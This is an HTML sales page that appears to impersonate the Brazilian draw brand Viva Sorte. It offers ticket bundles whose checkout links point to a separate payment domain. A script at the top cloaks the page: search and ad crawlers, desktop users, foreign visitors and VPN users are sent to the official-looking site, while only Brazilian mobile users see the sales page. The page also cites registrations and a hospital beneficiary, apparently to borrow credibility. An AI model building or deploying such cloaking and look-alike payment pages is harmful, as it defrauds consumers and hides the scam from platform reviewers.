<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Viva Sorte</title>

  <script>
    (function() {
      // Função para detectar se é mobile
      function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      }

      // Função para detectar país
      async function checkCountry() {
        try {
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          return data.country === 'BR';
        } catch (error) {
          return false;
        }
      }

      // Função para detectar VPN/Proxy
      async function checkProxy() {
        try {
          const response = await fetch('https://ipapi.co/proxy/');
          const isProxy = await response.text();
          return isProxy === 'True';
        } catch (error) {
          return true; // Em caso de erro, assume que é proxy
        }
      }

      // Função para detectar bots
      function isBot() {
        const botPatterns = [
          'bot', 'spider', 'crawl', 'APIs-Google', 'AdsBot', 'Googlebot', 'mediapartners', 'Google Favicon',
          'FeedFetcher', 'Google-Read-Aloud', 'DuplexWeb-Google', 'googleweblight', 'bing', 'yandex',
          'baidu', 'duckduck', 'yahoo', 'ecosia', 'ia_archiver', 'facebook', 'instagram', 'pinterest',
          'reddit', 'slack', 'twitter', 'whatsapp', 'youtube', 'semrush'
        ];
        const userAgent = navigator.userAgent.toLowerCase();
        return botPatterns.some(bot => userAgent.includes(bot));
      }

      // Função principal de redirecionamento
      async function checkAndRedirect() {
        // URL de redirecionamento
        const redirectUrl = 'https://vivasorteoficial.com.br/?lm_source=reseller_link&reseller_slug=628d615a-ae9&gad_source=1&gclid=Cj0KCQiAst67BhCEARIsAKKdWOlrm29epG4jyuZpgj7UnTJaLHgLl6ewa1-NUPcjLWVgiZT8g1zXTR4aAtUPEALw_wcB&referrer_domain=google.com';

        // Se for bot, redireciona imediatamente
        if (isBot()) {
          window.location.href = redirectUrl;
          return;
        }

        // Verifica dispositivo
        if (!isMobile()) {
          window.location.href = redirectUrl;
          return;
        }

        // Verifica país e proxy
        try {
          const [isFromBrazil, isProxy] = await Promise.all([
            checkCountry(),
            checkProxy()
          ]);

          if (!isFromBrazil || isProxy) {
            window.location.href = redirectUrl;
            return;
          }
        } catch (error) {
          window.location.href = redirectUrl;
        }
      }

      // Executa a verificação
      checkAndRedirect();
    })();
  </script>

  <link href="css/style.css" rel="stylesheet">
  <link href="css/header.css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
  <link rel="stylesheet" href="css/bootstrap-icons.min.css">
  
  <script>
    window.pixelId = "67591726b1d7e085d2700fc8";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>     

  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-subids
    async
    defer
  ></script>

  <script>
    // Captura os UTMs assim que a página carregar
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const utmParams = {
        utm_source: urlParams.get('utm_source') || null,
        utm_medium: urlParams.get('utm_medium') || null,
        utm_campaign: urlParams.get('utm_campaign') || null,
        utm_content: urlParams.get('utm_content') || null,
        utm_term: urlParams.get('utm_term') || null,
        src: urlParams.get('src') || null,
        sck: urlParams.get('sck') || null
      };
      localStorage.setItem('utmParams', JSON.stringify(utmParams));
      console.log('UTMs capturados:', utmParams); // Debug
    });
  </script>
  <!-- Meta Pixel Code -->
  <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '8957407444350268');
    fbq('track', 'PageView');
  </script>
  <noscript>
    <img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=8957407444350268&ev=PageView&noscript=1"/>
  </noscript>
  <!-- End Meta Pixel Code -->
</head>
<body>
  <header>
    <div class="container">
      <div class="menu-container">
        <div class="logo-group">
          <img src="images/logo.png" class="logo" alt="Logomarca do Viva Sorte" draggable="false">
          <svg class="svg-inline--fa fa-bars text-inherit fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="bars" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="display: inline-block;">
          </svg>
        </div>
      </div>
    </div>
  </header>
  <div class="banner">
    <div class="container-banner">
      <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
        <div class="carousel-inner">
          <div class="carousel-item active">
            <div class="tag-compre-agora">
              <span>Compre agora!</span>
            </div>
            <img src="images/banner-1401.webp" class="d-block w-100" alt="Banner principal">
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="sorteio-date w-100 text-center">
    <h1>Sorteio em <span style="background-color: #f0ad4e;">12/01</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
  </div>

  <script>
    function atualizarContador() {
      var span = document.getElementById('contador');
      var hoje = new Date();
      var dataFinal = new Date('2024-01-12');
      var diferenca = dataFinal - hoje;
      var diasRestantes = Math.ceil(diferenca / (1000 * 60 * 60 * 24));
      
      if (diasRestantes <= 0) {
        span.textContent = "HOJE";
      } else {
        span.textContent = diasRestantes === 1 ? '1 dia' : diasRestantes + ' dias';
      }
    }
    atualizarContador();
    setInterval(atualizarContador, 1000 * 60 * 60); // Atualiza a cada hora
  </script>

  <div class="container-principal">
    <div class="cotas">
      <div class="cotas-one">
        <button type="button" class="cota" onclick="selecionarValor(15)">
          <div class="cota-qtd">
            +15
          </div>
          <h1>R$14,85</h1>
          <h2>SELECIONAR</h2>
        </button>

        <button type="button" class="cota" onclick="selecionarValor(30)">
          <div class="cota-qtd">
            +30
          </div>
          <h1>R$29,70</h1>
          <h2>SELECIONAR</h2>
        </button>

        <button type="button" class="cota" onclick="selecionarValor(40)">
          <div class="cota-qtd">
            +40
          </div>
          <h1>R$39,60</h1>
          <h2>SELECIONAR</h2>
        </button>
      </div>

      <div class="cotas-one">
        <button type="button" class="cota" onclick="selecionarValor(70)">
          <i class="bi bi-star-fill destaque"></i>
          <div class="cota-qtd">
            +70
          </div>
          <h1>R$69,30</h1>
          <h2>SELECIONAR</h2>
        </button>

        <button type="button" class="cota" onclick="selecionarValor(100)">
          <div class="cota-qtd">
            +100
          </div>
          <h1>R$99,00</h1>
          <h2>SELECIONAR</h2>
        </button>

        <button type="button" class="cota" onclick="selecionarValor(200)">
          <div class="cota-qtd">
            +200
          </div>
          <h1>R$198,00</h1>
          <h2>SELECIONAR</h2>
        </button>
      </div>
    </div>
  </div>

  <div class="container-principal">
    <div class="contador-cotas">
      <span>
        <button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button>
      </span>
      <input type="number" id="numero" class="input-contador-cotas" value="0" min="0" oninput="highlightButton()">
      <span>
        <button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button>
      </span>
    </div>

    <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="adicionarAoCarrinho()" disabled>
      <i class="bi bi-cart-fill"></i> Comprar
    </button>

    <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
      <br>
      <h1 style="font-size: 0.72rem;">Comprar mais títulos aumenta suas chances de ganhar!</h1>

      <div class="container-principal">
        <div class="hospital">
          <div class="card-hospital">
            <div class="card-hospital-image">
              <img src="images/logo-hospital.svg">
              <h2>Instituição beneficiada</h2>
            </div>
            <div class="card-hospital-text">
              <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai, foi originalmente chamado Centro Norte Paranaense de Pesquisas Médicas. Criado com o objetivo de melhorar o tratamento do câncer e a qualidade de vida, o hospital focava inicialmente na prevenção do câncer de colo de útero entre as mulheres de Londrina e região. A instituição sempre buscou aprimorar seus recursos humanos, científicos e tecnológicos.</p>
            </div>
          </div>

          <div class="card-hospital card-hospital-bg-azul">
            <div class="card-hospital-image">
              <img src="images/viva-hosp.svg">
              <h2>Viva Privilégios</h2>
            </div>
            <div class="card-hospital-text">
              <p>Viva Privilégios, um programa que enriquece sua vida com acesso à saúde, alimentação, transporte e mais. Com cada compra, acumule pontos para trocar por consultas médicas, receber cashback, e utilizar serviços de telefonia e apps de transporte e alimentação. Eleve sua qualidade de vida e desfrute de mais conveniência e economia!</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <link href="css/rodape.css" rel="stylesheet">

  <div class="rodape">
    <div class="container-principal">
      <img class="logo-rodape" src="images/logo.png">

      <div class="redes">
        <i class="bi bi-instagram"></i>
        <i class="bi bi-facebook"></i>
        <i class="bi bi-twitter"></i>
        <i class="bi bi-youtube"></i>
      </div>

      <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>

      <div class="linha-rodape"></div>

      <div class="patterns-rodape">
        <div class="pattern-rodape">
          Títulos emitidos por:
          <img src="images/viacap.png">
        </div>

        <div class="pattern-rodape">
          Promoção realizada por:
          <img src="images/viva.png">
        </div>

        <div class="pattern-rodape">
          Desenvolvimento:
          <img src="images/edjdigital.png">
        </div>
      </div>
    </div>
  </div>

  <script>
    const precoPorUnidade = 0.99;

    function incrementar() {
      var input = document.getElementById('numero');
      var valorAtual = parseInt(input.value);
      if (valorAtual < 200) {
        if (valorAtual === 0) {
          input.value = 20;
        } else if (valorAtual === 20) {
          input.value = 30;
        } else if (valorAtual === 30) {
          input.value = 40;
        } else if (valorAtual === 40) {
          input.value = 70;
        } else if (valorAtual === 70) {
          input.value = 100;
        } else if (valorAtual === 100) {
          input.value = 200;
        }
      }
      highlightButton();
    }

    function decrementar() {
      var input = document.getElementById('numero');
      var valorAtual = parseInt(input.value);
      if (valorAtual > 20) {
        if (valorAtual === 200) {
          input.value = 100;
        } else if (valorAtual === 100) {
          input.value = 70;
        } else if (valorAtual === 70) {
          input.value = 40;
        } else if (valorAtual === 40) {
          input.value = 30;
        } else if (valorAtual === 30) {
          input.value = 20;
        }
      }
      highlightButton();
    }

    function highlightButton() {
      var input = document.getElementById('numero');
      var valorAtual = parseInt(input.value);
      var botoesCotas = document.querySelectorAll('.cota');
      var botaoAdicionarCarrinho = document.getElementById('btn-adicionar-carrinho');

      botoesCotas.forEach(function(botao) {
        botao.classList.remove('cota-selected');
        var valorBotao = parseInt(botao.querySelector('.cota-qtd').innerText.trim());
        if (valorBotao === valorAtual) {
          botao.classList.add('cota-selected');
        }
      });

      botaoAdicionarCarrinho.disabled = valorAtual === 0;
    }

    function selecionarValor(quantidade) {
      const input = document.getElementById('numero');
      input.value = quantidade;
      highlightButton();
    }

    function adicionarAoCarrinho() {
      const quantidade = parseInt(document.getElementById('numero').value);
      let checkoutUrl;
      
      // Recupera os parâmetros UTM diretamente da URL atual
      const urlParams = new URLSearchParams(window.location.search);
      const utmParams = {
        utm_source: urlParams.get('utm_source'),
        utm_medium: urlParams.get('utm_medium'),
        utm_campaign: urlParams.get('utm_campaign'),
        utm_content: urlParams.get('utm_content'),
        utm_term: urlParams.get('utm_term'),
        src: urlParams.get('src'),
        sck: urlParams.get('sck')
      };
      
      switch(quantidade) {
        case 15:
          checkoutUrl = 'https://pay.viva-sorte.live/a6pVgdxDbo7gk7B';
          break;
        case 30:
          checkoutUrl = 'https://pay.viva-sorte.live/yOeXZK7K9YaZAQa';
          break;
        case 40:
          checkoutUrl = 'https://pay.viva-sorte.live/lDW0ZaKqbv8gN7E';
          break;
        case 70:
          checkoutUrl = 'https://pay.viva-sorte.live/lqv130Ajp1bZxbj';
          break;
        case 100:
          checkoutUrl = 'https://pay.viva-sorte.live/JqoR32lJLjJGVj5';
          break;
        case 200:
          checkoutUrl = 'https://pay.viva-sorte.live/eApQgzmlKLRGEb7';
          break;
        default:
          alert('Por favor, selecione uma quantidade válida de tickets');
          return;
      }
      
      // Constrói a string de UTMs apenas com parâmetros que existem
      const utmString = Object.entries(utmParams)
        .filter(([_, value]) => value !== null && value !== undefined && value !== '')
        .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
        .join('&');
      
      // Adiciona os parâmetros UTM à URL de checkout
      if (utmString) {
        checkoutUrl += (checkoutUrl.includes('?') ? '&' : '?') + utmString;
      }
      
      // Debug para verificar os UTMs
      console.log('URL final:', checkoutUrl);
      
      window.location.href = checkoutUrl;
    }

    document.getElementById('numero').addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
      var valor = parseInt(this.value);
      if (valor > 500) {
        this.value = 500;
      } else if (valor < 10) {
        this.value = 0;
      } else if (valor % 10 !== 0) {
        this.value = Math.floor(valor / 10) * 10;
      }
      highlightButton();
    });
  </script>

  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-subids
    async
    defer
  ></script>
</body>
</html>